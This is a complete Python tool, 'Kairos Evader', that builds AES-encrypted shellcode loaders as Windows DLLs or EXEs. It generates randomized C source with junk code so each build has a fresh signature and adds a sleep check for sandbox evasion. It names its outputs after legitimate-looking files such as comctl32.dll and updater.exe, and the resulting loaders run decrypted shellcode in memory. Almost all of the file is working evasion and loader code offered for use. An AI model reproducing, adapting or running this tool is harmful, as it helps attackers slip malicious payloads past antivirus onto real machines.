#!/usr/bin/env python3
"""
Kairos Evader - Hardened AES-256 Encrypted Shellcode Loader
Author: Tyler Ramsbey
https://kairossec.com

Generates randomized loaders as DLL or EXE with Defender evasion.

Usage:
    python3 kairos_evader.py --payload payload.bin --dll comctl32.dll
    python3 kairos_evader.py --payload payload.bin --exe updater.exe
    python3 kairos_evader.py --payload payload.bin --exe updater.exe --delay 10
"""

import argparse
import os
import random
import string
import subprocess
import sys
import tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

VERSION = "2.0"
AUTHOR  = "Tyler Ramsbey"
TOOL    = "Kairos Evader"


# \u2500\u2500\u2500 Randomization Helpers \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def rand_name(length=None):
    """Generate a random C-safe identifier."""
    if length is None:
        length = random.randint(6, 14)
    first = random.choice(string.ascii_letters + "_")
    rest = ''.join(random.choices(string.ascii_letters + string.digits + "_", k=length - 1))
    return first + rest


def rand_int():
    """Generate a random integer for junk operations."""
    return random.randint(1, 50000)


def generate_junk_lines(count=None):
    """Generate random junk code lines that compile but do nothing meaningful."""
    if count is None:
        count = random.randint(2, 6)

    lines = []
    for _ in range(count):
        choice = random.randint(0, 7)
        v = rand_name(8)

        if choice == 0:
            lines.append(f"    int {v} = {rand_int()} + {rand_int()}; (void){v};")
        elif choice == 1:
            lines.append(f"    volatile int {v} = {rand_int()} ^ {rand_int()};")
        elif choice == 2:
            lines.append(f"    char {v}[] = \"{rand_name(random.randint(3, 8))}\"; (void){v};")
        elif choice == 3:
            lines.append(f"    if ({rand_int()} > {rand_int() + 50001}) {{ volatile int {v} = {rand_int()}; }}")
        elif choice == 4:
            lines.append(f"    volatile DWORD {v} = GetTickCount() + {rand_int()};")
        elif choice == 5:
            lines.append(f"    for (int {v} = 0; {v} < {random.randint(1, 3)}; {v}++) {{ volatile int {rand_name(6)} = {rand_int()}; }}")
        elif choice == 6:
            lines.append(f"    volatile unsigned long {v} = (unsigned long)({rand_int()} * {random.randint(1, 100)});")
        elif choice == 7:
            lines.append(f"    DWORD {v} = 0; {v} += {rand_int()}; (void){v};")

    return "\n".join(lines)


def generate_junk_functions(count=None):
    """Generate complete junk functions that never get called meaningfully."""
    if count is None:
        count = random.randint(2, 5)

    functions = []
    for _ in range(count):
        fname = rand_name(10)
        ret_type = random.choice(["int", "DWORD", "void"])
        body = generate_junk_lines(random.randint(2, 5))

        if ret_type == "void":
            ret_stmt = ""
        elif ret_type == "int":
            ret_stmt = f"\n    return {rand_int()};"
        else:
            ret_stmt = f"\n    return (DWORD){rand_int()};"

        func = f"""
{ret_type} {fname}() {{
{body}{ret_stmt}
}}
"""
        functions.append(func)
    return "\n".join(functions)


# \u2500\u2500\u2500 C Source Generation \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def generate_source(key: bytes, iv: bytes, fmt: str, delay: int) -> str:
    """Generate a randomized C loader source."""

    fn_decrypt   = rand_name(12)
    var_enc_size = rand_name(10)
    var_alg      = rand_name(10)
    var_key_h    = rand_name(10)
    var_plain    = rand_name(10)
    var_tmp_iv   = rand_name(10)
    var_cb_plain = rand_name(10)
    var_old_prot = rand_name(10)
    var_key_arr  = rand_name(10)
    var_iv_arr   = rand_name(10)

    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    iv_hex  = ", ".join(f"0x{b:02x}" for b in iv)

    if delay > 0:
        delay_ms = delay * 1000
        delay_var = rand_name(8)
        delay_code = f"""
    // Timing check
    DWORD {delay_var} = GetTickCount();
    Sleep({delay_ms});
    if (GetTickCount() - {delay_var} < {delay_ms - 500}) return;
"""
    else:
        delay_code = ""

    junk_funcs = generate_junk_functions()

    source = f"""
#include <windows.h>
#include <bcrypt.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

extern unsigned char _binary_payload_enc_start[];
extern unsigned char _binary_payload_enc_end[];

unsigned char {var_key_arr}[] = {{ {key_hex} }};
unsigned char {var_iv_arr}[]  = {{ {iv_hex} }};

{junk_funcs}

void {fn_decrypt}() {{
{delay_code}
{generate_junk_lines()}

    DWORD {var_enc_size} = (DWORD)(_binary_payload_enc_end - _binary_payload_enc_start);

    BCRYPT_ALG_HANDLE {var_alg} = NULL;
    BCRYPT_KEY_HANDLE {var_key_h} = NULL;
    ULONG {var_cb_plain} = 0;

{generate_junk_lines()}

    BCryptOpenAlgorithmProvider(&{var_alg}, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty({var_alg}, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey({var_alg}, &{var_key_h}, NULL, 0, {var_key_arr}, sizeof({var_key_arr}), 0);

    unsigned char* {var_plain} = (unsigned char*)VirtualAlloc(
        NULL, {var_enc_size}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!{var_plain}) {{
        BCryptDestroyKey({var_key_h});
        BCryptCloseAlgorithmProvider({var_alg}, 0);
        return;
    }}

{generate_junk_lines()}

    UCHAR {var_tmp_iv}[16];
    memcpy({var_tmp_iv}, {var_iv_arr}, 16);

    BCryptDecrypt({var_key_h}, _binary_payload_enc_start, {var_enc_size}, NULL,
                  {var_tmp_iv}, sizeof({var_tmp_iv}), {var_plain}, {var_enc_size}, &{var_cb_plain},
                  BCRYPT_BLOCK_PADDING);

    DWORD {var_old_prot};
    VirtualProtect({var_plain}, {var_cb_plain}, PAGE_EXECUTE_READ, &{var_old_prot});

    ((void(*)()){var_plain})();

    BCryptDestroyKey({var_key_h});
    BCryptCloseAlgorithmProvider({var_alg}, 0);
}}
"""

    if fmt == "dll":
        var_thread = rand_name(10)
        source += f"""
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {{
    if (dwReason == DLL_PROCESS_ATTACH) {{
        HANDLE {var_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){fn_decrypt}, NULL, 0, NULL);
        if ({var_thread}) CloseHandle({var_thread});
    }}
    return TRUE;
}}
"""
    else:
        var_thread = rand_name(10)
        source += f"""
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
{generate_junk_lines()}
    HANDLE {var_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){fn_decrypt}, NULL, 0, NULL);
    if ({var_thread}) {{
        WaitForSingleObject({var_thread}, INFINITE);
        CloseHandle({var_thread});
    }}
    return 0;
}}
"""

    return source


# \u2500\u2500\u2500 Build Logic \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

def check_tools():
    """Verify mingw toolchain is available."""
    tools = {
        "x86_64-w64-mingw32-gcc":     "compiler",
        "x86_64-w64-mingw32-objcopy": "objcopy",
    }
    for tool, label in tools.items():
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            print(f"  [!] {label} not found: {tool}")
            print("      Install with: sudo apt install mingw-w64")
            sys.exit(1)


def encrypt_payload(payload_path: str) -> tuple:
    """Read and AES-256-CBC encrypt the shellcode. Returns (encrypted, key, iv)."""
    with open(payload_path, "rb") as f:
        shellcode = f.read()

    key = os.urandom(32)
    iv  = os.urandom(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))

    print(f"  [*] Shellcode size: {len(shellcode):,} bytes")
    print(f"  [*] Encrypted size: {len(encrypted):,} bytes")
    print(f"  [*] AES-256 Key:    {key.hex()}")
    print(f"  [*] IV:             {iv.hex()}")

    return encrypted, key, iv


def build(payload_path: str, output_path: str, fmt: str, delay: int):
    """Encrypt payload and compile into the specified format."""
    compiler = "x86_64-w64-mingw32-gcc"
    objcopy  = "x86_64-w64-mingw32-objcopy"

    encrypted, key, iv = encrypt_payload(payload_path)

    source = generate_source(key, iv, fmt, delay)

    with tempfile.TemporaryDirectory() as tmpdir:
        enc_path = os.path.join(tmpdir, "payload.enc")
        obj_path = os.path.join(tmpdir, "payload_enc.o")
        c_path   = os.path.join(tmpdir, "loader.c")

        with open(enc_path, "wb") as f:
            f.write(encrypted)

        print("  [*] Converting encrypted payload to object file...")
        result = subprocess.run([
            objcopy,
            "-I", "binary",
            "-O", "pe-x86-64",
            "-B", "i386:x86-64",
            "--rename-section", ".data=.rdata",
            "payload.enc",
            obj_path
        ], cwd=tmpdir, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"  [!] objcopy failed:\n{result.stderr}")
            sys.exit(1)

        with open(c_path, "w") as f:
            f.write(source)

        output_full = os.path.join(os.getcwd(), output_path)
        print(f"  [*] Compiling {output_path} ({fmt.upper()})...")

        compile_cmd = [compiler, "-O2"]

        if fmt == "dll":
            compile_cmd += ["-shared"]

        compile_cmd += [
            "-mwindows",
            "-o", output_full,
            c_path,
            obj_path,
            "-lbcrypt"
        ]

        result = subprocess.run(compile_cmd, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"  [!] Compilation failed:\n{result.stderr}")
            sys.exit(1)

    file_size = os.path.getsize(output_path)
    print()
    print(f"  [+] Success! Built {output_path} ({file_size:,} bytes)")
    print(f"  [+] Format: {fmt.upper()}")
    if delay > 0:
        print(f"  [+] Sandbox delay: {delay}s")
    print(f"  [+] Unique binary \u2014 rebuild anytime for a fresh signature")


def banner():
    print("""
Kairos Evader - AES-256 Encrypted Shellcode Loader
Author: Tyler Ramsbey
https://kairos-sec.com
""")


def main():
    banner()

    parser = argparse.ArgumentParser(
        description=f"{TOOL} v{VERSION} by {AUTHOR} \u2014 Hardened AES-256 Encrypted Shellcode Loader Builder"
    )
    parser.add_argument(
        "--payload", "-p",
        required=True,
        help="Path to raw shellcode file (e.g. payload.bin)"
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=0,
        help="Seconds to sleep before decryption for sandbox evasion (default: 0)"
    )

    output = parser.add_mutually_exclusive_group(required=True)
    output.add_argument(
        "--dll", "-d",
        metavar="FILENAME",
        help="Build as DLL (e.g. comctl32.dll)"
    )
    output.add_argument(
        "--exe", "-e",
        metavar="FILENAME",
        help="Build as EXE (e.g. updater.exe)"
    )

    args = parser.parse_args()

    if not os.path.isfile(args.payload):
        print(f"  [!] Payload not found: {args.payload}")
        sys.exit(1)

    check_tools()

    if args.dll:
        build(args.payload, args.dll, "dll", args.delay)
    else:
        build(args.payload, args.exe, "exe", args.delay)

    print()


if __name__ == "__main__":
    main()
